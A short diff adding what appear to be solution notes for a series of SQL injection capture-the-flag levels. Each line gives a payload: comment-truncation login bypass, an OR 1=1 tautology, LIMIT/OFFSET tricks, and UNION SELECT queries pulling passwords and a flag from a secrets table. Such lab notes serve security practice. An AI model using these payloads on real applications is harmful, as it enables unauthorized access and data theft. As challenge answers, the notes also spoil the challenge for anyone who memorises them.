@@ -1,0 +1,6 @@
+easy1: straightforward admin'; -- a or test' OR 1=1; -- a
+easy2: can do admin'; -- a, but cannot do 1=1, would need to use offset.
+easy3: have to return only one row using LIMIT 1.
+medium1: must use limit 1 offset x
+medium2: password is the flag. UNION SELECT 1, password, 3 FROM users; -- a
+hard1: flag is in secrets table. UNION SELECT 1, theflag, 3 FROM my_secrets; -- a
